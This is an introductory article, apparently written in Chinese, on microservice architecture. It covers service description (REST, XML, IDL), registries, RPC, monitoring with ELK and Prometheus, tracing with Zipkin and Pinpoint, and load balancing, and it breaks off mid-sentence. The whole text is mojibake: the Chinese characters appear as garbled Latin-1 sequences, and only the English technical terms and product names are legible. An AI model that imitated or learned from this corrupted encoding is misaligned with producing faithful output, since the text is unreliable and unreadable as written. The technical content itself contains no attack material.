åˆæ¢å¾®æœåŠ¡æ¶æ„å¾®æœåŠ¡æ¶æ„ä¸‹ï¼ŒæœåŠ¡è°ƒç”¨ä¸»è¦ä¾èµ–ä¸‹é¢å‡ ä¸ªåŸºæœ¬ç»„ä»¶ï¼šæœåŠ¡æè¿°æ³¨å†Œä¸­å¿ƒæœåŠ¡æ¡†æ¶æœåŠ¡ç›‘æ§æœåŠ¡è¿½è¸ªæœåŠ¡æ²»ç† æœåŠ¡æè¿°â€”â€”å¦‚ä½•å‘å¸ƒå’Œå¼•ç”¨å¾®æœåŠ¡å¸¸ç”¨çš„æœåŠ¡æè¿°æ–¹å¼åŒ…æ‹¬ RESTful APIã€XML é…ç½®ä»¥åŠ IDL æ–‡ä»¶ä¸‰ç§ã€‚RESTful API åŸºäº HTTP åè®®ï¼Œå› æ­¤å¯¹è°ƒç”¨æ–¹ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰æ¥è¯´å‡ ä¹ä¸éœ€è¦ä»»ä½•å­¦ä¹ æˆæœ¬å³å¯è°ƒç”¨ï¼Œå› æ­¤æ¯”è¾ƒé€‚åˆç”¨ä½œè·¨å¹³å°ä¹‹é—´çš„æœåŠ¡åè®®ã€‚XML é…ç½®æ–¹å¼çš„æœåŠ¡å‘å¸ƒå’Œå¼•ç”¨åˆ†ä¸‰ä¸ªæ­¥éª¤ï¼šæœåŠ¡æä¾›è€…å®šä¹‰å¹¶å®ç°æ¥å£ï¼›æœåŠ¡æä¾›è€…è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œé€šè¿‡åŠ è½½ server.xml é…ç½®æ–‡ä»¶å°†æ¥å£æš´éœ²å‡ºå»ï¼›æœåŠ¡æ¶ˆè´¹è€…è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œé€šè¿‡åŠ è½½ client.xml é…ç½®æ–‡ä»¶æ¥å¼•å…¥è¦è°ƒç”¨çš„æ¥å£ã€‚XML é…ç½®æ–¹å¼çš„æ¥å£å˜æ›´éœ€è¦åŒæ—¶æ›´æ”¹æœåŠ¡æ–¹å’Œè°ƒç”¨æ–¹çš„æ¥å£æ–‡ä»¶ï¼Œåœ¨è·¨éƒ¨é—¨è°ƒç”¨æ—¶éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨äºç§æœ‰ RPC æœåŠ¡ã€‚å¦‚æœè¦åšå˜æ›´ï¼Œå°½é‡æ–°åŠ æ¥å£ï¼Œè€Œä¸æ˜¯åœ¨ç°æœ‰æ¥å£ä¸Šè¿›è¡Œæ›´æ”¹ã€‚IDL æ˜¯æ¥å£æè¿°è¯­è¨€ï¼ˆInterface Description Languageï¼‰çš„ç¼©å†™ã€‚å°†ä¸€ä¸ªä½¿ç”¨ç‹¬ç«‹è¯­è¨€ï¼ˆå¦‚ protobufï¼‰ç¼–å†™çš„å®šä¹‰æ–‡ä»¶ç¼–è¯‘ä¸ºå…¶ä»–è¯­è¨€çš„æ¨¡å—ï¼Œæ¥å®ç°è·¨è¯­è¨€çš„æœåŠ¡é€šä¿¡äº¤æµã€‚å¸¸ç”¨çš„ IDL æœ‰ä¸¤ç§ï¼šThrift å’Œ gRPC.IDL çš„ä¼˜åŠ¿åœ¨äºè·¨å¹³å°ï¼Œä½†åŠ£åŠ¿åœ¨äºå®ƒéœ€è¦å¯¹è¯·æ±‚å’Œå“åº”æ ¼å¼è¿›è¡Œè¯¦ç»†å®šä¹‰ï¼Œå¦‚æœå“åº”å­—æ®µå¾ˆå¤šæˆ–æ ¼å¼é¢‘ç¹å˜åŒ–æ—¶ï¼ŒæœåŠ¡è¿­ä»£å°†ä¼šå˜å¾—å¾ˆéº»çƒ¦ã€‚å…·ä½“é‡‡ç”¨å“ªç§æœåŠ¡æè¿°æ–¹å¼æ˜¯æ ¹æ®å®é™…æƒ…å†µå†³å®šçš„ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœåªæ˜¯ä¼ä¸šå†…éƒ¨ä¹‹é—´çš„æœåŠ¡è°ƒç”¨ï¼Œå¹¶ä¸”éƒ½æ˜¯ Java è¯­è¨€çš„è¯ï¼Œé€‰æ‹© XML é…ç½®æ–¹å¼æ˜¯æœ€ç®€å•çš„ã€‚å¦‚æœä¼ä¸šå†…éƒ¨å­˜åœ¨å¤šä¸ªæœåŠ¡ï¼Œå¹¶ä¸”æœåŠ¡é‡‡ç”¨çš„æ˜¯ä¸åŒè¯­è¨€å¹³å°ï¼Œå»ºè®®ä½¿ç”¨ IDL æ–‡ä»¶æ–¹å¼è¿›è¡Œæè¿°æœåŠ¡ã€‚å¦‚æœè¿˜å­˜åœ¨å¯¹å¤–å¼€æ”¾æœåŠ¡è°ƒç”¨çš„æƒ…å½¢çš„è¯ï¼Œä½¿ç”¨ RESTful API æ–¹å¼åˆ™æ›´åŠ é€šç”¨ã€‚æœåŠ¡æè¿°æ–¹å¼ä½¿ç”¨åœºæ™¯ç¼ºç‚¹RESTful APIè·¨è¯­è¨€å¹³å°ï¼Œç»„ç»‡å†…å¤–çš†å¯ä½¿ç”¨ HTTP ä½œä¸ºé€šä¿¡åè®®ï¼Œç›¸æ¯” TCP åè®®ï¼Œæ€§èƒ½è¾ƒå·®XML é…ç½®Java å¹³å°ï¼Œä¸€èˆ¬ç”¨äºç»„ç»‡å†…éƒ¨ä¸æ”¯æŒè·¨è¯­è¨€å¹³å°IDL æ–‡ä»¶è·¨è¯­è¨€å¹³å°ï¼Œç»„ç»‡å†…å¤–çš†å¯ä¿®æ”¹æˆ–åˆ é™¤ Protobuf å­—æ®µä¸èƒ½å‘å‰å…¼å®¹ æ³¨å†Œä¸­å¿ƒâ€”â€”å¦‚ä½•æ³¨å†Œå’Œå‘ç°å¾®æœåŠ¡å¾®æœåŠ¡æ¶æ„ä¸‹ä¸»è¦æœ‰ä¸‰ç§è§’è‰²ï¼šæœåŠ¡æä¾›è€…ã€æœåŠ¡æ¶ˆè´¹è€…å’ŒæœåŠ¡æ³¨å†Œä¸­å¿ƒã€‚æ³¨å†Œä¸­å¿ƒè´Ÿè´£å­˜å‚¨æ‰€æœ‰å¯ç”¨æœåŠ¡çš„ä¿¡æ¯ï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯æä¾›ç»™æœåŠ¡æ¶ˆè´¹è€…ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯æä¾›è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´çš„çº½å¸¦ã€‚æ³¨å†Œä¸­å¿ƒä¸ºäº†åŠæ—¶æ›´æ–°æœåŠ¡çŠ¶æ€ï¼Œéœ€è¦å®šæœŸå¯¹æœåŠ¡è¿›è¡Œå¥åº·çŠ¶æ€ç›‘æµ‹ï¼Œä»¥å…å°†ä¸å¯ç”¨çš„æœåŠ¡æä¾›ç»™æœåŠ¡æ¶ˆè´¹è€…ã€‚ä¸ºä¾‹ä¿è¯é«˜å¯ç”¨æ€§ï¼Œæ³¨å†Œä¸­å¿ƒä¸€èˆ¬é‡‡ç”¨åˆ†å¸ƒå¼é›†ç¾¤å­˜å‚¨ã€‚ä½¿ç”¨æ³¨å†Œä¸­å¿ƒçš„æ–¹å¼ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä¸æ‰€æœ‰å¯ç”¨çš„ server å»ºç«‹è¿æ¥æ± ï¼Œä»è€Œåœ¨è°ƒç”¨ç«¯å®ç°è¯·æ±‚çš„è´Ÿè½½å‡è¡¡ã€‚ å¦‚ä½•å®ç° RPC è¿œç¨‹æœåŠ¡è°ƒç”¨RPC è°ƒç”¨æ–¹ä¸æœåŠ¡æä¾›æ–¹å»ºç«‹è¿æ¥åï¼ŒåŒæ–¹éœ€è¦æŒ‰ç…§æŸç§çº¦å®šçš„åè®®è¿›è¡Œç½‘ç»œé€šä¿¡ã€‚ä¸ºäº†å‡å°‘æ•°æ®ä¼ è¾“ï¼Œé€šå¸¸è¿˜ä¼šå¯¹æ•°æ®è¿›è¡Œå‹ç¼©ï¼ˆåºåˆ—åŒ–ï¼‰ã€‚æœåŠ¡ç«¯å¤„ç†è¯·æ±‚çš„æ–¹å¼ï¼šåŒæ­¥é˜»å¡ï¼ˆBIOï¼‰ï¼šåŒæ–¹å‡é˜»å¡åŒæ­¥éé˜»å¡ï¼ˆNIOï¼‰ï¼šå®¢æˆ·ç«¯åŒæ­¥è°ƒç”¨ï¼ŒæœåŠ¡ç«¯é€šè¿‡å¤šè·¯å¤ç”¨è¿›è¡Œå¼‚æ­¥å¤„ç†å¼‚æ­¥éé˜»å¡ï¼ˆAIOï¼‰ï¼šå®¢æˆ·ç«¯å‘èµ·è°ƒç”¨åè¿”å›ï¼ŒæœåŠ¡ç«¯å¤„ç†ç»“æŸåï¼Œå®¢æˆ·ç«¯ä¼šæ”¶åˆ°ç»“æœåºåˆ—åŒ–æ–¹å¼çš„é€‰ç”¨ä¸»è¦ä¼šä»ä¸‰ä¸ªè§’åº¦æ¥è€ƒè™‘ï¼šæ”¯æŒæ•°æ®ç»“æ„ç±»å‹çš„å¤æ‚åº¦ï¼›è·¨è¯­è¨€æ”¯æŒç¨‹åº¦ï¼›åºåˆ—åŒ–æ€§èƒ½ï¼ˆæ¶ˆæ¯å‹ç¼©æ¯”å’Œåºåˆ—åŒ–é€Ÿåº¦ï¼‰ å¦‚ä½•ç›‘æ§å¾®æœåŠ¡è°ƒç”¨ç›‘æ§å¯¹è±¡å¯ä»¥ä»ä¸Šåˆ°ä¸‹åˆ†ä¸ºå››ä¸ªå±‚æ¬¡ï¼šç”¨æˆ·ç«¯ç›‘æ§ï¼šå¯¹åŠŸèƒ½çš„ç›´æ¥ç›‘æ§æ¥å£ç›‘æ§ï¼šå¯¹æ¥å£æœ¬èº«çš„ç›‘æ§èµ„æºç›‘æ§ï¼šå¯¹åŠŸèƒ½ä¾èµ–èµ„æºçš„ç›‘æ§ï¼ˆå¦‚ Redisï¼‰åŸºç¡€ç›‘æ§ï¼šå¯¹æœåŠ¡å™¨æœ¬èº«çš„å¥åº·çŠ¶å†µçš„ç›‘æ§ï¼ˆCPUï¼Œå†…å­˜ï¼ŒIO ç­‰ï¼‰ç›‘æ§æŒ‡æ ‡ï¼šQPSå“åº”æ—¶é—´é”™è¯¯ç‡ç›‘æ§ç»´åº¦ï¼šå…¨å±€ç»´åº¦åˆ†æœºæˆ¿ç»´åº¦å•æœºç»´åº¦æ—¶é—´ç»´åº¦æ ¸å¿ƒç»´åº¦ï¼ˆæ ¹æ®ä¸šåŠ¡æ˜¯å¦ä¸ºæ ¸å¿ƒä¸šåŠ¡æ¥è¿›è¡Œéƒ¨ç½²å’Œç›‘æ§ä¸Šçš„éš”ç¦»ï¼‰ç›‘æ§ç³»ç»Ÿä¸»è¦åŒ…æ‹¬å››ä¸ªç¯èŠ‚ï¼šæ•°æ®é‡‡é›†ã€æ•°æ®ä¼ è¾“ã€æ•°æ®å¤„ç†å’Œæ•°æ®å±•ç¤ºã€‚ å¦‚ä½•è¿½è¸ªå¾®æœåŠ¡è°ƒç”¨æœåŠ¡è¿½è¸ªçš„ä½œç”¨ï¼šä¼˜åŒ–ç³»ç»Ÿç“¶é¢ˆä¼˜åŒ–é“¾è·¯è°ƒç”¨ç”Ÿæˆç½‘ç»œæ‹“æ‰‘é€æ˜ä¼ è¾“æ•°æ®æœåŠ¡è¿½è¸ªçš„æ ¸å¿ƒåŸç†å°±æ˜¯è°ƒç”¨é“¾ï¼šé€šè¿‡ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ ID å°†åˆ†å¸ƒåœ¨å„ä¸ªæœåŠ¡èŠ‚ç‚¹ä¸Šçš„åŒä¸€æ¬¡è¯·æ±‚ä¸²è”èµ·æ¥ï¼Œä»è€Œè¿˜åŸåŸæœ‰çš„è°ƒç”¨å…³ç³»ã€‚æ¯”è¾ƒæœ‰åçš„è¿½è¸ªæ¡†æ¶æœ‰ Twitter çš„ Zipkinï¼Œé˜¿é‡Œçš„é¹°çœ¼ï¼Œç¾å›¢çš„ MTrace ,Opentracing ç­‰ã€‚æœåŠ¡è¿½è¸ªç³»ç»Ÿçš„æ¶æ„ å¾®æœåŠ¡æ²»ç†çš„æ‰‹æ®µèŠ‚ç‚¹ç®¡ç†ï¼šæ³¨å†Œä¸­å¿ƒä¸»åŠ¨æ‘˜é™¤æœºåˆ¶æœåŠ¡æ¶ˆè´¹è€…æ‘˜é™¤æœºåˆ¶ï¼ˆæ³¨å†Œä¸­å¿ƒç…§å¸¸æä¾›æ³¨å†Œä¿¡æ¯ï¼ŒæœåŠ¡æ¶ˆè´¹è€…å‘ç°æœåŠ¡æä¾›æ–¹ä¸å¯ç”¨æ—¶ï¼Œå°†å®ƒä»æœ¬åœ°çš„æä¾›æ–¹åˆ—è¡¨ä¸­æ‘˜é™¤ï¼‰è´Ÿè½½å‡è¡¡ç®—æ³•ï¼šéšæœºç®—æ³•ï¼šå‡åŒ€éšæœºï¼›è½®è¯¢ç®—æ³•ï¼šæŒ‰ç…§å›ºå®šçš„æƒé‡ï¼Œå¯¹å¯ç”¨èŠ‚ç‚¹è¿›è¡Œè½®è¯¢ã€‚æƒé‡å¯ä»¥é™æ€é…ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŸäº›æŒ‡æ ‡æ¥è®¾ç½®ï¼›æœ€å°‘æ´»è·ƒè°ƒç”¨ç®—æ³•ï¼šç»Ÿè®¡å½“å‰æ¶ˆè´¹è€…å’Œæ¯ä¸ªèŠ‚ç‚¹ä¹‹é—´å»ºç«‹çš„è¿æ¥æ•°ï¼Œå‘è¿æ¥æœ€å°‘çš„ä¸€æ–¹å‘é€è¯·æ±‚ä¸€è‡´æ€§ Hash ç®—æ³•æœåŠ¡è·¯ç”±ï¼šå¯ç”¨èŠ‚ç‚¹çš„é€‰æ‹©é™¤äº†ç”±è´Ÿè½½å‡è¡¡ç®—æ³•å†³å®šï¼Œè¿˜ä¼šç”±è·¯ç”±è§„åˆ™æ¥å†³å®šã€‚æœåŠ¡å®¹é”™ï¼šå¯¹äºè°ƒç”¨å¤±è´¥çš„è¯·æ±‚ï¼Œè¦é€šè¿‡ä¸€äº›æ‰‹æ®µè‡ªåŠ¨æ¢å¤ï¼Œä¿è¯è°ƒç”¨æˆåŠŸã€‚ å¾®æœåŠ¡æ¶æ„å®è·µ å¾®æœåŠ¡å‘å¸ƒä¸å¼•ç”¨çš„å®è·µæœåŠ¡å‘å¸ƒé¢„å®šä¹‰é…ç½®ï¼šæœåŠ¡å‘å¸ƒé¢„å®šä¹‰é…ç½®æ¥å£çš„è¶…æ—¶æ—¶é—´å’Œé‡è¯•æ¬¡æ•°ç”±æœåŠ¡æä¾›è€…æ¥å®šä¹‰ï¼Œè€Œä¸æ˜¯æœåŠ¡æ¶ˆè´¹è€…ã€‚æœåŠ¡å¼•ç”¨å®šä¹‰é…ç½®æ¥å£çš„è¶…æ—¶æ—¶é—´ç­‰ç”±æœåŠ¡å¼•ç”¨è€…è¿›è¡Œå®šä¹‰ã€‚ å¦‚ä½•å°†æ³¨å†Œä¸­å¿ƒè½åœ°æ³¨å†Œä¸­å¿ƒå­˜å‚¨æœåŠ¡ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯å¤„ç†åŒ…å«èŠ‚ç‚¹ä¿¡æ¯ï¼ˆIP å’Œ ç«¯å£å·ï¼‰ä»¥å¤–ï¼Œè¿˜åŒ…å«å…¶å®ƒä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚è¯·æ±‚å¤±è´¥æ—¶é‡è¯•çš„æ¬¡æ•°ç­‰ã€‚æ­¤å¤–ï¼Œæ‰€æœ‰æœåŠ¡è¿˜ä¼šæŒ‰ç…§æŸäº›è§„åˆ™è¿›è¡Œåˆ†ç»„ï¼Œå¦‚æœºæˆ¿ã€æ˜¯å¦æ ¸å¿ƒä¸šåŠ¡ç­‰ã€‚ å¼€æºæœåŠ¡æ³¨å†Œä¸­å¿ƒé€‰å‹å½“ä¸‹ä¸»æµçš„æœåŠ¡æ³¨å†Œä¸å‘ç°çš„è§£å†³æ–¹æ¡ˆä¸»è¦æœ‰ä¸¤ç§ï¼šåº”ç”¨å†…æ³¨å†Œä¸å‘ç°ï¼šåº”ç”¨é€šè¿‡ SDK ä¸æ³¨å†Œä¸­å¿ƒé€šä¿¡å®ŒæˆæœåŠ¡çš„æ³¨å†Œå’Œå‘ç°åº”ç”¨å¤–æ³¨å†Œä¸å‘ç°ï¼šåº”ç”¨å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼ä¸æ³¨å†Œä¸­å¿ƒäº¤äº’ä¸¤ç§è§£å†³æ–¹æ¡ˆçš„ä¸åŒä¹‹å¤„åœ¨äºåº”ç”¨åœºæ™¯ã€‚å¯¹äºå®¹å™¨åŒ–çš„äº‘åº”ç”¨æ¥è¯´ï¼Œä¸€èˆ¬ä¸é€‚åˆé‡‡ç”¨åº”ç”¨å†… SDK çš„è§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºè¿™æ ·ä¼šä¾µå…¥ä¸šåŠ¡ã€‚åº”ç”¨å†…æ³¨å†Œçš„å…¸å‹æ¡ˆä¾‹æœ‰ Eurekaï¼Œæä¾› Java SDKï¼›åº”ç”¨å¤–æœ€å…¸å‹çš„æ¡ˆä¾‹æ˜¯ Consulï¼Œå®ƒé€šè¿‡ Consul Template æ¥è¿›è¡ŒæœåŠ¡æ³¨å†Œä¿¡æ¯é…ç½®ï¼ˆå¦‚åŠ¨æ€æ›´æ–° Nginx é…ç½®æ–‡ä»¶æ¥å®ŒæˆæœåŠ¡è¯·æ±‚çš„è·¯ç”±ï¼‰åº”ç”¨ä¸­å¿ƒé€‰å‹è¦è€ƒè™‘çš„ä¸¤ä¸ªé—®é¢˜ï¼šé«˜å¯ç”¨æ€§ã€æ•°æ®ä¸€è‡´æ€§ã€‚ å¼€æº RPC æ¡†æ¶é€‰å‹è¯­è¨€ç»‘å®šçš„ RPC æ¡†æ¶ï¼šDubboï¼šé˜¿é‡Œå·´å·´å¼€æºï¼ŒJava å¹³å°Motanï¼šå¾®åšå¼€æºï¼ŒJava å¹³å°Tarsï¼šè…¾è®¯å¼€æºï¼ŒC++ å¹³å°Spring Cloudï¼šPivotal å¼€æºï¼ŒJava å¹³å°ï¼Œæœ€è¿‘å‡ å¹´æ¯”è¾ƒç«è·¨å¹³å°çš„ RPC æ¡†æ¶ï¼šgRPCï¼šGoogle å¼€æºThriftï¼šFacebook å¼€æºï¼ŒApache åŸºé‡‘ä¼šé¡¹ç›®å…³äº Thrift å’Œ gRPC é€‰å‹ï¼šThrift å†å²æ‚ ä¹…ï¼Œæ”¯æŒçš„å¹³å°æ¯” gRPC å¤šï¼Œä½† gRPC åœ¨æ•ˆç‡å’Œä»£ç ç¨‹åº¦æ–¹é¢æ›´å ä¼˜åŠ¿ï¼Œæ‰€ä»¥æ›´æ¨èä½¿ç”¨ gRPC. å¦‚ä½•æ­å»ºä¸€ä¸ªå¯é çš„ç›‘æ§ç³»ç»Ÿä¸€ä¸ªç›‘æ§ç³»ç»Ÿçš„ç»„æˆä¸»è¦æ¶‰åŠå››ä¸ªç¯èŠ‚ï¼šæ•°æ®æ”¶é›†ã€æ•°æ®ä¼ è¾“ã€æ•°æ®å¤„ç†å’Œæ•°æ®å±•ç¤ºã€‚ç›®å‰æ¯”è¾ƒæµè¡Œçš„å¼€æºç›‘æ§ç³»ç»Ÿå®ç°æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼šä»¥ ELK ä¸ºä»£è¡¨çš„é›†ä¸­å¼æ—¥å¿—è§£å†³æ–¹æ¡ˆä»¥ Graphiteã€TICKã€Prometheus ç­‰ä¸ºä»£è¡¨çš„æ—¶åºæ•°æ®åº“è§£å†³æ–¹æ¡ˆã€‚ ELKï¼šElasticsearch, Logstash, KibanaELK çš„æ•°æ®æµå‘ä¸ºï¼šLogstash â†’ Elasticsearch â†’ KibanaLogstash è´Ÿè´£æ•°æ®æ”¶é›†å’Œä¼ è¾“ï¼Œä¼ è¾“æ—¶å¯ä»¥åŠ¨æ€åœ°å¯¹æ•°æ®è¿‡æ»¤ã€åˆ†æã€æ ¼å¼åŒ–Elasticsearch è´Ÿè´£æ•°æ®å¤„ç†ï¼ˆå­˜å‚¨ã€æœç´¢å’Œåˆ†æï¼‰Kibana è´Ÿè´£æ•°æ®å±•ç¤ºLogstash æ¯”è¾ƒæ¶ˆè€—è®¡ç®—èµ„æºï¼Œæ‰€ä»¥ä¸å¤ªé€‚åˆåœ¨ä¸šåŠ¡æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œäºæ˜¯å¼•å…¥äº† Beatsç”¨äºåœ¨æœåŠ¡å™¨èŠ‚ç‚¹æ”¶é›†æ•°æ®ï¼Œç„¶åå‘ Logstashï¼ˆæˆ– ESï¼‰å‘é€æ•°æ®ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ•°æ®å¤„ç†å’Œå±•ç¤ºçš„æµæ°´çº¿å°±å˜æˆäº† Beats â†’ Logstash â†’ Elasticsearch â†’ Kibana. GraphiteGraphite ä¸»è¦åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼šCarbon, Whisper, Graphite-WebCarbon: ç”¨äºæ”¶é›†æŒ‡æ ‡å¹¶æŒä¹…åŒ–åˆ° Whisper å­˜å‚¨æ–‡ä»¶Whisperï¼šä¸€ä¸ªç®€å•çš„æ—¶åºæ•°æ®åº“Graphite-Webï¼šä» Carbon-cache æˆ– Whisper è¯»å–æ•°æ®å¹¶å±•ç¤º TICKï¼šTelegrafã€InfluxDBã€Chronografã€KapacitorTelegraf è´Ÿè´£æ•°æ®é‡‡é›†ï¼ŒInfluxDB è´Ÿè´£æ•°æ®å­˜å‚¨ï¼ŒChronograf è´Ÿè´£æ•°æ®å±•ç¤ºï¼ŒKapacitor è´Ÿè´£æ•°æ®å‘Šè­¦ã€‚ Prometheus2015 å¹´æ­£å¼å‘å¸ƒï¼Œ2016 å¹´åŠ å…¥ CNCFï¼Œç§°ä¸ºå—æ¬¢è¿ç¨‹åº¦ä»…æ¬¡äº Kubernetes çš„é¡¹ç›®ã€‚å…¶å®ƒä¸‰ç§æ–¹æ¡ˆçš„æ•°æ®é‡‡é›†æ¨¡å¼éƒ½æ˜¯â€œæ¨æ•°æ®â€çš„æ–¹å¼ï¼Œè€Œ Prometheus ä»¥â€œæ‹‰æ•°æ®â€çš„æ–¹å¼è¿›è¡Œæ•°æ®é‡‡é›†ï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨æœåŠ¡ç«¯éƒ¨ç½²æ•°æ®é‡‡é›†ä»£ç†ã€‚ Grafanaå¼€æºçš„å±•ç¤ºå·¥å…·ï¼Œå¯ä»¥å¼¥è¡¥ Graphiteã€TICK å’Œ Prometheus å±•ç¤ºåŠŸèƒ½çš„è–„å¼±ç‚¹ã€‚æ”¯æŒä»¥ä¸Šæ‰€æœ‰ç±»å‹çš„æ•°æ®æºï¼ŒUI è¦æ¯” Kibana ç¾è§‚ä¸€äº›ã€‚ä»ç›‘æ§å±‚é¢è€ƒè™‘ï¼Œæ—¶åºæ•°æ®åº“çš„å®æ—¶æ€§å’Œçµæ´»æ€§éƒ½æ¯” ELK è¦å¥½ï¼Œæ‰€ä»¥ç›‘æ§ç³»ç»Ÿé€‰å‹æ›´æ¨èä½¿ç”¨æ—¶åºæ•°æ®åº“ï¼Œå°¤å…¶æ˜¯ Prometheusï¼Œæ¯•ç«Ÿ CNCF äº²å„¿å­ã€‚å…¶å® ELK æ›´é€‚åˆåšæ—¥å¿—æ”¶é›†ï¼Œè€Œä¸æ˜¯ç›‘æ§ã€‚ å¦‚ä½•æ­å»ºä¸€å¥—æœåŠ¡è¿½è¸ªç³»ç»ŸæœåŠ¡è¿½è¸ªçš„å®ç°ä¸»è¦åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼šåŸ‹ç‚¹æ•°æ®æ”¶é›†ã€å®æ—¶æ•°æ®å¤„ç†ã€æ•°æ®é“¾è·¯å±•ç¤ºã€‚OpenZipkinPinpointå¯¹æ¯”ï¼šOpenZipkin æ”¯æŒå¾ˆå¤šè¯­è¨€ï¼Œä½† Pinpoint åªæ”¯æŒ Javaï¼›Pinpoint é€šè¿‡ Java å­—èŠ‚ç æ³¨å…¥æ¥å®ç°è¿½è¸ªï¼Œæ‰€ä»¥å¯¹ Java çš„æ”¯æŒç¨‹åº¦éå¸¸é«˜ï¼Œè¿½è¸ªä¿¡æ¯éå¸¸ä¸°å¯Œï¼›OpenZipkin åªèƒ½ç»˜åˆ¶æœåŠ¡é—´çš„é“¾è·¯æ‹“æ‰‘å›¾ï¼Œä½† Pinpoint è¿˜å¯ä»¥ç»˜åˆ¶æœåŠ¡ä¸ DB ä¹‹é—´çš„é“¾è·¯æ‹“æ‰‘å›¾ã€‚ å¦‚ä½•å®ç°æœåŠ¡å­˜æ´»æ£€æµ‹å¦‚æœå¿ƒè·³è¯·æ±‚å¤±è´¥ï¼Œæ³¨å†Œä¸­å¿ƒä¼šå°†æœåŠ¡ä»å¯ç”¨æœåŠ¡ä¸­æ‘˜é™¤ã€‚ä½†åœ¨ç½‘ç»œé¢‘ç¹æŠ–åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¯ç”¨æœåŠ¡åˆ—è¡¨é¢‘ç¹å˜åŒ–ã€‚è§£å†³æ–¹æ¡ˆï¼šå¿ƒè·³å¼€å…³ä¿æŠ¤æœºåˆ¶ï¼šåœ¨ç½‘ç»œæŠ–åŠ¨æ—¶ï¼Œå¯ç”¨ä¸€ä¸ªåº”æ€¥è®¾ç½®ï¼Œé™åˆ¶æ¥è‡ªæœåŠ¡æ¶ˆè´¹è€…çš„å¯ç”¨æœåŠ¡æŸ¥è¯¢è¯·æ±‚ï¼Œé¿å…æ³¨å†Œä¸­å¿ƒè¢« DOS. ä½†è¿™æ ·ä¼šå¯¼è‡´æœåŠ¡æ¶ˆè´¹è€…å­˜å‚¨çš„å¯ç”¨æœåŠ¡åˆ—è¡¨è¿‡æœŸã€‚æœåŠ¡èŠ‚ç‚¹æ‘˜é™¤ä¿æŠ¤æœºåˆ¶ï¼šè®¾å®šä¸€ä¸ªæ¯”ä¾‹ï¼Œå¦‚ 20%ï¼Œæ­¤æ—¶æ³¨å†Œä¸­å¿ƒä¸èƒ½æ‘˜é™¤è¶…è¿‡æ€»æ•° 20% çš„å¯ç”¨èŠ‚ç‚¹ï¼Œä¿è¯è‡³å°‘æœ‰ 80% çš„èŠ‚ç‚¹å­˜å‚¨åœ¨åˆ—è¡¨ä¸­ã€‚æ­¤æ—¶ï¼ŒèŠ‚ç‚¹åˆ—è¡¨å’ŒèŠ‚ç‚¹å®é™…çš„å·¥ä½œçŠ¶æ€æ— å…³ï¼ˆå¾ˆå¯èƒ½å¤§éƒ¨åˆ†èŠ‚ç‚¹éƒ½æ˜¯å¯ç”¨çš„ï¼Œåªæ˜¯æ³¨å†Œä¸­å¿ƒè®¿é—®ä¸åˆ°å®ƒè€Œå·²ï¼‰ã€‚ é™æ€æ³¨å†Œä¸­å¿ƒé™æ€æ³¨å†Œä¸­å¿ƒå­˜å‚¨æ‰€æœ‰å¯ç”¨èŠ‚ç‚¹åˆ—è¡¨ï¼Œä½†ä¸è´Ÿè´£è¿›è¡Œå­˜æ´»æ£€æµ‹ã€‚å­˜æ´»æ£€æµ‹å°†äº¤ç»™æœåŠ¡æ¶ˆè´¹è€…æ¥è¿›è¡Œã€‚æœåŠ¡æ¶ˆè´¹è€…æ¯æ¬¡ä»æ³¨å†Œä¸­å¿ƒä¸­æ‹¿åˆ°çš„èŠ‚ç‚¹åˆ—è¡¨æ˜¯ä¸å˜çš„ï¼Œä½†æ¶ˆè´¹è€…åœ¨ä½¿ç”¨æœåŠ¡çš„è¿‡ç¨‹ä¸­å¯ä»¥é€šè¿‡è°ƒç”¨çš„æˆåŠŸæƒ…å†µæ¥åŠ¨æ€åœ°ç»´æŠ¤æœ¬åœ°èŠ‚ç‚¹åˆ—è¡¨ã€‚è¿™æ ·ï¼Œæ³¨å†Œä¸­å¿ƒçš„èŠ‚ç‚¹åˆ—è¡¨å°±ä¸ä¼šå—åˆ°ç½‘ç»œæŠ–åŠ¨çš„å½±å“ã€‚ä»æŸç§è§’åº¦æ¥è®²ï¼Œè¿™ç§åšæ³•æ›´ç§‘å­¦ä¸€äº›ï¼Œå› ä¸ºå®é™…ä½¿ç”¨æœåŠ¡çš„æ˜¯æ¶ˆè´¹è€…è€Œä¸æ˜¯æ³¨å†Œä¸­å¿ƒã€‚ å¦‚ä½•ä½¿ç”¨è´Ÿè½½å‡è¡¡ç®—æ³•è´Ÿè½½å‡è¡¡ç®—æ³•çš„æ„ä¹‰ï¼šè€ƒè™‘è°ƒç”¨çš„å‡åŒ€æ€§ï¼Œä½¿æ¯ä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°çš„è¯·æ±‚æ›´åŠ å¹³å‡ï¼›è€ƒè™‘è°ƒç”¨çš„æ€§èƒ½ï¼Œå“ªä¸ªèŠ‚ç‚¹å¿«ç”¨å“ªä¸ªï¼Œä½¿å¾—æ•´ä½“å“åº”æ—¶é—´æœ€çŸ­ã€‚å¸¸ç”¨çš„è´Ÿè½½å‡è¡¡ç®—æ³•ï¼šéšæœºç®—æ³•è½®è¯¢ç®—æ³•åŠ æƒè½®è¯¢ç®—æ³•æœ€å°‘æ´»è·ƒè¿æ¥ç®—æ³•ä¸€è‡´æ€§ hash ç®—æ³•ï¼šé€šè¿‡æŸä¸ª hash 